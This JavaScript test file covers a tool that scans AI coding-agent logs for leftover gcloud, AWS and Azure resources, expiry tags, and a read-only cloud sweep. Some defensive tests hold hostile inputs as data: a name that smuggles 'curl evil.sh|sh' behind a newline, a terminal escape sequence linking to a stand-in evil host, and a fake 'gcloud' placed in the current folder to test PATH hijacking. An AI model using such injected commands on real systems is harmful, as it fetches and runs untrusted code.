'use strict';
// v0.3.1: expiry/session tags, orphaned disks and IPs after a VM delete, and --sweep.
const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');
const { tokenize } = require('../src/shell');
const tags = require('../src/tags');
const { scan } = require('../src/scan');
const report = require('../src/report');

const iso = (minsAgo) => new Date(Date.now() - minsAgo * 60000).toISOString();
const DAY = 1440;

// A Claude Code log with the given bash commands, oldest first.
function claudeLog(dir, cmds) {
  const sid = 'tags-demo';
  const cwd = '/home/dev/code/infra';
  const L = [];
  let t = cmds.length * 10 + 5 * DAY;
  cmds.forEach((c, n) => {
    const command = typeof c === 'string' ? c : c.cmd;
    if (typeof c === 'object' && c.at !== undefined) t = c.at;
    const id = `toolu_${n}`;
    L.push({ sessionId: sid, cwd, timestamp: iso(t), type: 'assistant', message: { role: 'assistant', content: [{ type: 'tool_use', id, name: 'Bash', input: { command } }] } });
    L.push({ sessionId: sid, cwd, timestamp: iso(t - 1), type: 'user', message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: id, content: 'ok', is_error: false }] } });
    t -= 10;
  });
  fs.mkdirSync(dir, { recursive: true });
  const f = path.join(dir, 'tags-demo.jsonl');
  fs.writeFileSync(f, L.map((o) => JSON.stringify(o)).join('\n') + '\n');
  return f;
}

const FAKE = (name, log) => `#!${process.execPath}
const fs = require('fs');
const a = process.argv.slice(2);
fs.appendFileSync(${JSON.stringify(log)}, ${JSON.stringify(name)} + ' ' + a.join(' ') + '\\n');
const out = (o) => { process.stdout.write(JSON.stringify(o)); process.exit(0); };
const past = '2026-01-02', future = '2099-01-01';
if (${JSON.stringify(name)} === 'gcloud') {
  if (a.includes('instances')) out([
    { name: 'eval-gpu-7', zone: 'https://www.googleapis.com/compute/v1/projects/p/zones/us-central1-a', labels: { expires: past, 'agent-session': 'abc123' }, creationTimestamp: '2026-01-01T00:00:00Z' },
    { name: 'prod-web', zone: 'projects/p/zones/us-central1-a', labels: { team: 'web' } },
    { name: 'keep-me', zone: 'projects/p/zones/us-central1-a', labels: { expires: future } }]);
  if (a.includes('disks')) out([{ name: 'scratch-old', zone: 'projects/p/zones/us-east1-b', labels: { ttl: '4h' }, creationTimestamp: '2026-03-01T10:00:00Z' }]);
  if (a.includes('addresses')) out([{ name: 'demo-ip', region: 'projects/p/regions/us-central1', labels: { expires: '2026-02-01t09-30' } }]);
}
if (${JSON.stringify(name)} === 'aws') out({ ResourceTagMappingList: [
  { ResourceARN: 'arn:aws:ec2:us-east-1:111:elastic-ip/eipalloc-0aa', Tags: [{ Key: 'Expires', Value: past }, { Key: 'Session', Value: 'abc123' }] },
  { ResourceARN: 'arn:aws:ec2:us-east-1:111:volume/vol-0bb', Tags: [{ Key: 'Name', Value: 'data' }] },
  { ResourceARN: 'arn:aws:s3:::tmp-bucket-9', Tags: [{ Key: 'delete-after', Value: '1767225600' }] }] });
process.stderr.write('unexpected'); process.exit(1);
`;

module.exports = function run(t, bin, env) {
  console.log('tags and expiry');
  t('gcloud --labels read', () => assert.deepStrictEqual(tags.tagsFromCommand(tokenize('gcloud compute instances create vm1 --labels=expires=2026-11-07,agent-session=abc'), ''), { expires: '2026-11-07', 'agent-session': 'abc' }));
  t('aws --tag-specifications read (shorthand)', () => {
    const raw = 'aws ec2 run-instances --image-id ami-1 --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=gpu},{Key=expires,Value=2026-11-07}]"';
    assert.deepStrictEqual(tags.tagsFromCommand(tokenize(raw), raw), { name: 'gpu', expires: '2026-11-07' });
  });
  t('aws --tags JSON read', () => {
    const raw = `aws s3api put-bucket-tagging --bucket b --tagging '{"TagSet":[{"Key":"ttl","Value":"3d"}]}'`;
    assert.strictEqual(tags.tagsFromCommand(tokenize(raw), raw).ttl, '3d');
  });
  t('az --tags with several pairs', () => assert.deepStrictEqual(tags.tagsFromCommand(tokenize('az vm create -n v -g rg --tags expires=2026-11-07 session=s1 --image Ubuntu2204'), ''), { expires: '2026-11-07', session: 's1' }));
  t('date expiry = end of that day UTC', () => assert.strictEqual(tags.parseExpiry('2026-11-07'), '2026-11-07T23:59:59.000Z'));
  t('gcp-style datetime 2026-11-07t18-30', () => assert.strictEqual(tags.parseExpiry('2026-11-07t18-30'), '2026-11-07T18:30:00.000Z'));
  t('unix seconds', () => assert.strictEqual(tags.parseExpiry('1767225600'), '2026-01-01T00:00:00.000Z'));
  t('ttl counted from creation', () => assert.strictEqual(tags.parseExpiry('4h', '2026-03-01T10:00:00Z'), '2026-03-01T14:00:00.000Z'));
  t('ttl with no creation time is unreadable', () => assert.strictEqual(tags.parseExpiry('4h'), null));
  t('garbage is unreadable', () => assert.strictEqual(tags.parseExpiry('soon'), null));
  t('impossible dates are unreadable', () => { for (const v of ['2026-13-45', '2026', '2026-02-30', '2026-11-07t25-00']) assert.strictEqual(tags.parseExpiry(v), null, v); });

  const ev = (command, minsAgo, extra = {}) => ({ kind: 'cmd', command, time: iso(minsAgo), cwd: '/w', session: 's', tool: 'claude-code', failed: false, ...extra });
  const r1 = scan([
    ev('gcloud compute instances create eval-1 --zone us-central1-a --labels=expires=2026-01-02,agent-session=abc123', 3 * DAY),
    ev('gcloud compute instances create eval-2 --zone us-central1-a --labels=ttl=2h,agent-session=abc123', 60),
    ev('gcloud compute instances create eval-3 --zone us-central1-a --labels=expires=whenever', 50),
    ev('gcloud compute instances create plain --zone us-central1-a', 40),
  ]);
  const by = (res, rule, name) => res.resources.find((r) => r.rule === rule && (!name || r.name === name));
  t('expired tag marked expired', () => { const f = by(r1, 'gcp-vm', 'eval-1'); assert.ok(f.expired); assert.strictEqual(f.sessionTag, 'abc123'); });
  t('ttl not yet passed is not expired', () => { const f = by(r1, 'gcp-vm', 'eval-2'); assert.strictEqual(f.expired, false); assert.ok(f.expires); });
  t('unreadable expiry kept as raw', () => assert.strictEqual(by(r1, 'gcp-vm', 'eval-3').expiresRaw, 'whenever'));
  t('untagged has no tags', () => assert.strictEqual(by(r1, 'gcp-vm', 'plain').tags, undefined));
  const txt = report.text(r1, { days: 30, color: false });
  t('report shows EXPIRED and session', () => { assert.ok(/EXPIRED \d+ (days|h|min) ago/.test(txt)); assert.ok(/session abc123/.test(txt)); assert.ok(/1 of these is past its own expiry tag/.test(txt)); });
  t('report lists the expired one first', () => assert.ok(txt.indexOf('eval-1') < txt.indexOf('eval-2') && txt.indexOf('eval-1') < txt.indexOf('plain')));
  t('report says when an expiry tag is unreadable', () => assert.ok(/could not read it/.test(txt)));
  t('--tag filter matching', () => {
    assert.ok(tags.matchesTags(by(r1, 'gcp-vm', 'eval-1'), ['agent-session=abc123']));
    assert.ok(tags.matchesTags(by(r1, 'gcp-vm', 'eval-1'), ['expires']));
    assert.ok(!tags.matchesTags(by(r1, 'gcp-vm', 'plain'), ['agent-session']));
    assert.ok(!tags.matchesTags(by(r1, 'gcp-vm', 'eval-2'), ['agent-session=zzz']));
  });

  console.log('orphaned disks and IPs');
  const r2 = scan([
    ev('gcloud compute addresses create web-ip --region us-central1', 100),
    ev('gcloud compute instances create web-1 --zone us-central1-a --address=web-ip --no-boot-disk-auto-delete', 90),
    ev('gcloud compute instances create web-2 --zone us-central1-a', 85),
    ev('gcloud compute instances delete web-1 --zone us-central1-a --quiet', 80),
    ev('gcloud compute instances delete web-2 --zone us-central1-a --keep-disks=data --quiet', 75),
  ]);
  t('VM delete marks the VM cleaned', () => assert.strictEqual(by(r2, 'gcp-vm', 'web-1').status, 'cleaned'));
  t('boot disk kept when auto-delete was off', () => { const f = by(r2, 'gcp-kept-disk', 'web-1'); assert.ok(f && f.status === 'left'); assert.ok(f.teardown.startsWith('gcloud compute disks delete web-1 --zone us-central1-a')); });
  t('--keep-disks=data flagged', () => assert.ok(by(r2, 'gcp-kept-disk', 'web-2 (data disk)')));
  t('static IP gets the unattached note', () => assert.ok(/unattached/.test(by(r2, 'gcp-ip', 'web-ip').note)));
  t('normal delete with auto-delete on leaves no disk', () => {
    const r = scan([ev('gcloud compute instances create a1 --zone z1', 20), ev('gcloud compute instances delete a1 --zone z1', 10)]);
    assert.ok(!r.resources.some((f) => f.rule === 'gcp-kept-disk'));
  });
  t('disks delete cleans the kept boot disk', () => {
    const r = scan([ev('gcloud compute instances create b1 --zone z1 --no-boot-disk-auto-delete', 30), ev('gcloud compute instances delete b1 --zone z1', 20), ev('gcloud compute disks delete b1 --zone z1 --quiet', 10)]);
    assert.strictEqual(by(r, 'gcp-kept-disk', 'b1').status, 'cleaned');
  });
  const r3 = scan([
    ev('aws ec2 allocate-address --domain vpc', 60),
    ev('aws ec2 run-instances --image-id ami-1 --instance-type t3.large --block-device-mappings "DeviceName=/dev/sda1,Ebs={VolumeSize=100,DeleteOnTermination=false}" --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=bench}]"', 50),
    ev('aws ec2 terminate-instances --instance-ids i-0abc', 40),
  ]);
  t('EIP note after terminate', () => assert.ok(/until you release it/.test(by(r3, 'aws-eip').note)));
  t('EBS kept with DeleteOnTermination=false', () => assert.ok(by(r3, 'aws-kept-ebs', 'bench')));
  const r4 = scan([
    ev('az vm create -g lab -n jump --image Ubuntu2204 --size Standard_B2s', 60),
    ev('az vm delete -g lab -n jump --yes', 50),
    ev('az vm create -g lab -n clean --image Ubuntu2204 --os-disk-delete-option Delete --nic-delete-option Delete', 40),
    ev('az vm delete -g lab -n clean --yes', 30),
  ]);
  t('Azure VM delete leaves disk/NIC/IP flagged', () => { const f = by(r4, 'az-vm-orphans', 'jump'); assert.ok(f && f.status === 'left'); assert.ok(f.teardown.includes("az resource list -g lab")); });
  t('Azure VM with delete options still leaves the public IP', () => { const f = by(r4, 'az-vm-orphans', 'clean'); assert.ok(f); assert.ok(/left: public IP\./.test(f.note)); });
  t('Azure VM with delete options and no public IP leaves nothing', () => {
    const r = scan([ev('az vm create -g l -n q --image U --public-ip-address "" --os-disk-delete-option Delete --nic-delete-option Delete', 20), ev('az vm delete -g l -n q --yes', 10)]);
    assert.ok(!r.resources.some((f) => f.rule === 'az-vm-orphans'));
  });
  t('attach-volume then terminate flags the volume', () => {
    const r = scan([ev('aws ec2 create-volume --size 100 --availability-zone us-east-1a', 40), ev('aws ec2 attach-volume --volume-id vol-0abc --instance-id i-1 --device /dev/sdf', 30), ev('aws ec2 terminate-instances --instance-ids i-1', 20)]);
    const f = by(r, 'aws-kept-ebs', 'vol-0abc'); assert.ok(f); assert.ok(f.teardown.includes('vol-0abc'));
    assert.ok(!r.resources.some((x) => x.rule === 'aws-attach'));
  });
  t('--create-disk auto-delete=no is a data disk, not the boot disk', () => {
    const r = scan([ev('gcloud compute instances create d1 --zone z1 --create-disk=name=data1,size=100GB,auto-delete=no', 20), ev('gcloud compute instances delete d1 --zone z1', 10)]);
    assert.ok(by(r, 'gcp-kept-disk', 'd1 (data disk)')); assert.ok(!by(r, 'gcp-kept-disk', 'd1'));
  });
  t('az group delete cleans the leftovers', () => {
    const r = scan([ev('az vm create -g lab2 -n j2 --image U', 30), ev('az vm delete -g lab2 -n j2 --yes', 20), ev('az group delete -n lab2 --yes', 10)]);
    assert.strictEqual(by(r, 'az-vm-orphans', 'j2').status, 'cleaned');
  });
  t('an unrelated disk delete does not clear a kept disk', () => {
    const r = scan([ev('gcloud compute instances create k1 --zone z1 --no-boot-disk-auto-delete', 30), ev('gcloud compute instances delete k1 --zone z1', 20), ev('gcloud compute disks delete other-disk --zone z1', 10)]);
    assert.strictEqual(by(r, 'gcp-kept-disk', 'k1').status, 'left');
  });
  t('a newline in a name cannot become a live line in --script', () => {
    const f = { rule: 'gcp-vm', what: 'VM', name: 'x\ncurl evil.sh|sh', provider: 'gcloud', teardown: 'gcloud compute instances delete x\ncurl evil.sh|sh --quiet', status: 'left', time: iso(1), cwd: '/w' };
    const out = report.script({ resources: [f], spend: [] });
    assert.ok(out.split('\n').every((l) => l === '' || l.startsWith('#')));
  });
  t('terminate matched by instance ID: unrelated terminate flags nothing', () => {
    const r = scan([
      ev('aws ec2 run-instances --image-id ami-1 --block-device-mappings DeviceName=/dev/xvda,Ebs={DeleteOnTermination=false} --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=keep1}]"', 30, { instanceIds: ['i-0123456789abcdef0'] }),
      ev('aws ec2 terminate-instances --instance-ids i-0fffffffffffffff0', 20),
    ]);
    assert.ok(!r.resources.some((f) => f.rule === 'aws-kept-ebs'));
    const r2b = scan([
      ev('aws ec2 run-instances --image-id ami-1 --block-device-mappings DeviceName=/dev/xvda,Ebs={DeleteOnTermination=false} --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=keep1}]"', 30, { instanceIds: ['i-0123456789abcdef0'] }),
      ev('aws --profile p ec2 terminate-instances --instance-ids i-0123456789abcdef0', 20),
    ]);
    assert.ok(by(r2b, 'aws-kept-ebs', 'keep1'));
  });
  t('terminate before the launch flags nothing', () => {
    const r = scan([ev('aws ec2 terminate-instances --instance-ids i-0aaaaaaaaaaaaaaaa', 30), ev('aws ec2 run-instances --image-id ami-1 --block-device-mappings DeviceName=/dev/xvda,Ebs={DeleteOnTermination=false} --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=k}]"', 20)]);
    assert.ok(!r.resources.some((f) => f.rule === 'aws-kept-ebs'));
  });
  t('attach-volume to another instance is not flagged by this terminate', () => {
    const r = scan([ev('aws ec2 attach-volume --volume-id vol-0abc --instance-id i-2 --device /dev/sdf', 30), ev('aws ec2 terminate-instances --instance-ids i-1', 20)]);
    assert.ok(!r.resources.some((f) => f.rule === 'aws-kept-ebs'));
  });
  t('an unrelated delete-volume does not clear a kept volume', () => {
    const r = scan([ev('aws ec2 attach-volume --volume-id vol-0abc --instance-id i-1', 30), ev('aws ec2 terminate-instances --instance-ids i-1', 20), ev('aws ec2 delete-volume --volume-id vol-other', 10)]);
    assert.strictEqual(by(r, 'aws-kept-ebs', 'vol-0abc').status, 'left');
    const r5 = scan([ev('aws ec2 attach-volume --volume-id vol-0abc --instance-id i-1', 30), ev('aws ec2 terminate-instances --instance-ids i-1', 20), ev('aws ec2 delete-volume --volume-id vol-0abc', 10)]);
    assert.strictEqual(by(r5, 'aws-kept-ebs', 'vol-0abc').status, 'cleaned');
  });
  t('az: deleting web2VMNic leaves VM web alone; webVMNic only removes the NIC', () => {
    const r = scan([ev('az vm create -g rg -n web --image U', 40), ev('az vm delete -g rg -n web --yes', 30), ev('az network nic delete -g rg -n web2VMNic', 20)]);
    const f = by(r, 'az-vm-orphans', 'web'); assert.strictEqual(f.status, 'left'); assert.ok(/NIC/.test(f.note));
    const r6 = scan([ev('az vm create -g rg -n web --image U', 40), ev('az vm delete -g rg -n web --yes', 30), ev('az network nic delete -g rg -n webVMNic', 20)]);
    const g = by(r6, 'az-vm-orphans', 'web'); assert.strictEqual(g.status, 'left'); assert.ok(!/NIC,/.test(g.note)); assert.ok(/public IP/.test(g.note));
  });
  t('--keep-disks=all is not cleared by an unrelated disk delete', () => {
    const r = scan([ev('gcloud compute instances create vm1 --zone z', 30), ev('gcloud compute instances delete vm1 --zone z --keep-disks=all', 20), ev('gcloud compute disks delete scratch-unrelated --zone z', 10)]);
    const f = by(r, 'gcp-kept-disk', 'vm1 (all disks)'); assert.strictEqual(f.status, 'left'); assert.ok(/check before deleting/.test(f.note));
  });
  t('kept data disk teardown names the data disk, not the VM', () => {
    const r = scan([ev('gcloud compute instances create d1 --zone z1 --create-disk=name=data1,size=100GB,auto-delete=no', 20), ev('gcloud compute instances delete d1 --zone z1', 10)]);
    assert.ok(by(r, 'gcp-kept-disk', 'd1 (data disk)').teardown.startsWith('gcloud compute disks delete data1 --zone z1'));
  });
  t('orphans carry the project scope into the teardown', () => {
    const r = scan([ev('gcloud compute instances create p1 --zone z1 --project lab-1 --no-boot-disk-auto-delete', 20), ev('gcloud compute instances delete p1 --zone z1 --project lab-1', 10)]);
    assert.ok(/--project lab-1/.test(by(r, 'gcp-kept-disk', 'p1').teardown));
  });
  t('no orphan teardown skips a prompt', () => {
    for (const f of [...r2.resources, ...r3.resources, ...r4.resources]) if (f.orphan) assert.ok(!/--quiet|--yes|--force/.test(f.teardown), f.teardown);
  });
  t('--verify checks a kept boot disk by its disk name', () => {
    const chk = require('../src/verify').checkFor(by(r2, 'gcp-kept-disk', 'web-1'));
    assert.deepStrictEqual(chk.args.slice(0, 4), ['compute', 'disks', 'describe', 'web-1']);
  });
  t('sweep: Lambda alias ARN deletes the function, not the alias', () => assert.ok(require('../src/sweep').awsTeardown('arn:aws:lambda:us-east-1:1:function:api:live').startsWith('aws lambda delete-function --function-name api ')));
  t('sweep: odd Azure ids are single-quoted', () => assert.strictEqual(require('../src/sweep').sq("/subs/My RG $(id)"), "'/subs/My RG $(id)'"));
  t('a kept disk carries its VM session tag', () => {
    const r = scan([ev('gcloud compute instances create s2 --zone z1 --no-boot-disk-auto-delete --labels=agent-session=q1', 20), ev('gcloud compute instances delete s2 --zone z1', 10)]);
    assert.ok(tags.matchesTags(by(r, 'gcp-kept-disk', 's2'), ['agent-session=q1']));
  });
  t('orphans are found inside a script the agent wrote and ran', () => {
    const r = scan([
      { kind: 'write', file: '/w/down.sh', content: 'gcloud compute instances delete s3 --zone z1 --keep-disks=all\n', time: iso(25), cwd: '/w', session: 's', tool: 'claude-code' },
      ev('gcloud compute instances create s3 --zone z1', 30), ev('bash down.sh', 20),
    ].sort((a, b) => a.time.localeCompare(b.time)));
    assert.ok(by(r, 'gcp-kept-disk', 's3 (all disks)'));
  });
  const scr = report.script(r2);
  t('script carries the note', () => assert.ok(/# note: .*unattached/.test(scr)));

  console.log('CLI: --expired, --tag, --sweep');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'al-tags-'));
  const logFile = claudeLog(path.join(dir, 'logs'), [
    'gcloud compute instances create old-eval --zone us-central1-a --labels=expires=2026-01-02,agent-session=abc123',
    'gcloud compute instances create new-eval --zone us-central1-a --labels=expires=2099-01-01,agent-session=zzz',
    'gcloud compute disks create plain-disk --zone us-central1-a',
  ]);
  const cli = (args, extraEnv = {}) => spawnSync(process.execPath, [bin, '--logs', logFile, '--days', '3650', ...args], { env: { ...env, ...extraEnv }, encoding: 'utf8' });
  const je = JSON.parse(cli(['--json', '--expired']).stdout);
  t('--expired keeps only expired', () => assert.deepStrictEqual(je.resources.map((r) => r.name), ['old-eval']));
  const jt = JSON.parse(cli(['--json', '--tag', 'agent-session=zzz']).stdout);
  t('--tag session=zzz keeps only that session', () => assert.deepStrictEqual(jt.resources.map((r) => r.name), ['new-eval']));
  t('text shows the filter', () => assert.ok(/showing only: expired/.test(cli(['--expired', '--no-color']).stdout)));

  const fb = path.join(dir, 'bin');
  fs.mkdirSync(fb);
  const calls = path.join(fb, 'calls.log');
  fs.writeFileSync(calls, '');
  for (const n of ['gcloud', 'aws']) { const p = path.join(fb, n); fs.writeFileSync(p, FAKE(n, calls)); fs.chmodSync(p, 0o755); }
  const sw = cli(['--json', '--sweep'], { PATH: fb });
  const js = JSON.parse(sw.stdout);
  const names = js.sweep.items.filter((i) => i.expired).map((i) => i.name).sort();
  t('sweep finds expired across gcloud and aws', () => assert.deepStrictEqual(names, ['demo-ip', 'eval-gpu-7', 'scratch-old', 'tmp-bucket-9', 'eipalloc-0aa'].sort()));
  t('sweep skips untagged and future', () => assert.ok(!js.sweep.items.some((i) => i.name === 'prod-web' || (i.name === 'keep-me' && i.expired))));
  t('sweep: az missing is reported, not fatal', () => assert.ok(js.sweep.ran.some((r) => r.cli === 'az' && /not installed/.test(r.note))));
  t('sweep teardowns are right', () => {
    const get = (n) => js.sweep.items.find((i) => i.name === n).teardown;
    assert.strictEqual(get('eval-gpu-7'), 'gcloud compute instances delete eval-gpu-7 --zone us-central1-a   # asks before deleting');
    assert.ok(get('demo-ip').startsWith('gcloud compute addresses delete demo-ip --region us-central1 '));
    assert.ok(!js.sweep.items.some((i) => /--quiet|--force|--skip-final-snapshot/.test(i.teardown)));
    assert.strictEqual(get('eipalloc-0aa'), 'aws ec2 release-address --allocation-id eipalloc-0aa --region us-east-1');
    assert.ok(get('tmp-bucket-9').startsWith('aws s3 rb s3://tmp-bucket-9 '));
  });
  const logged = fs.readFileSync(calls, 'utf8').trim().split('\n');
  t('sweep ran only list / get-resources calls', () => { assert.ok(logged.length === 4); assert.ok(logged.every((l) => / list | get-resources /.test(l + ' '))); });
  const swr = cli(['--sweep', '--no-color', '--project', 'no-such-folder'], { PATH: fb });
  t('sweep counts toward the exit code', () => { assert.strictEqual(swr.status, 1); assert.ok(/Nothing left running in your agent logs/.test(swr.stdout)); });
  const swt = cli(['--sweep', '--no-color'], { PATH: fb }).stdout;
  t('sweep text section', () => { assert.ok(/5 resources in your cloud past their expiry tag/.test(swt)); assert.ok(/--sweep: listed 8 resources with gcloud, aws/.test(swt)); });
  t('sweep --tag narrows to one session', () => {
    const j = JSON.parse(cli(['--json', '--sweep', '--tag', 'agent-session=abc123'], { PATH: fb }).stdout);
    assert.deepStrictEqual(j.sweep.items.map((i) => i.name), ['eval-gpu-7']);
  });
  t('no --sweep, no cloud calls', () => { fs.writeFileSync(calls, ''); cli(['--json'], { PATH: fb }); assert.strictEqual(fs.readFileSync(calls, 'utf8'), ''); });
  t('--script from a log: a newline in a name never makes a live line', () => {
    const lf = claudeLog(path.join(dir, 'inj'), ['gcloud compute instances create "x\ncurl evil.sh|sh" --zone z']);
    const out = spawnSync(process.execPath, [bin, '--logs', lf, '--script'], { env, encoding: 'utf8' }).stdout;
    assert.ok(out.split('\n').every((l) => l === '' || l.startsWith('#')), out);
  });
  t('control characters never reach the terminal or JSON strings', () => {
    const lf = claudeLog(path.join(dir, 'esc'), ['aws s3 mb s3://\u001b]8;;http://evil\u0007bucket\u001b]8;;\u0007']);
    const txt2 = spawnSync(process.execPath, [bin, '--logs', lf, '--no-color'], { env, encoding: 'utf8' }).stdout;
    assert.ok(!/[\u0000-\u0008\u000b-\u001f\u007f]/.test(txt2));
    const js2 = spawnSync(process.execPath, [bin, '--logs', lf, '--json'], { env, encoding: 'utf8' }).stdout;
    assert.ok(!/\\u001b|\\u0007/.test(js2));
  });
  t('secret-looking tag values are masked in --json', () => {
    const lf = claudeLog(path.join(dir, 'sec'), ['gcloud compute instances create s1 --zone z --labels=api-token=abcdef123456,session=s9']);
    const j = JSON.parse(spawnSync(process.execPath, [bin, '--logs', lf, '--json'], { env, encoding: 'utf8' }).stdout);
    const f = j.resources.find((r) => r.name === 's1'); assert.strictEqual(f.tags['api-token'], '***'); assert.strictEqual(f.tags.session, 's9');
  });
  t('sweep never runs a gcloud sitting in the current folder', () => {
    const cwdDir = fs.mkdtempSync(path.join(os.tmpdir(), 'al-cwd-'));
    const marker = path.join(cwdDir, 'ran');
    fs.writeFileSync(path.join(cwdDir, 'gcloud'), `#!/bin/sh\necho x > ${JSON.stringify(marker)}\necho '[]'\n`); fs.chmodSync(path.join(cwdDir, 'gcloud'), 0o755);
    spawnSync(process.execPath, [bin, '--logs', logFile, '--days', '3650', '--json', '--sweep'], { env: { ...env, PATH: `.:${fb}` }, cwd: cwdDir, encoding: 'utf8' });
    assert.ok(!fs.existsSync(marker));
  });
  t('sweep stops calling a CLI after it times out once', () => {
    const slow = path.join(dir, 'slow'); fs.mkdirSync(slow);
    fs.writeFileSync(path.join(slow, 'gcloud'), `#!${process.execPath}\nsetTimeout(() => {}, 5000);\n`); fs.chmodSync(path.join(slow, 'gcloud'), 0o755);
    const t0 = Date.now();
    const r = require('../src/sweep').sweep({ timeoutMs: 400, env: { ...process.env, PATH: slow } });
    assert.ok(Date.now() - t0 < 2500); assert.strictEqual(r.ran.filter((x) => x.cli === 'gcloud').length, 1);
  });
  t('sweep calls pass the read-only guard', () => {
    const ver = require('../src/verify');
    for (const c of require('../src/sweep').CALLS) ver.assertReadOnly(c.cli, c.args, []);
  });
};
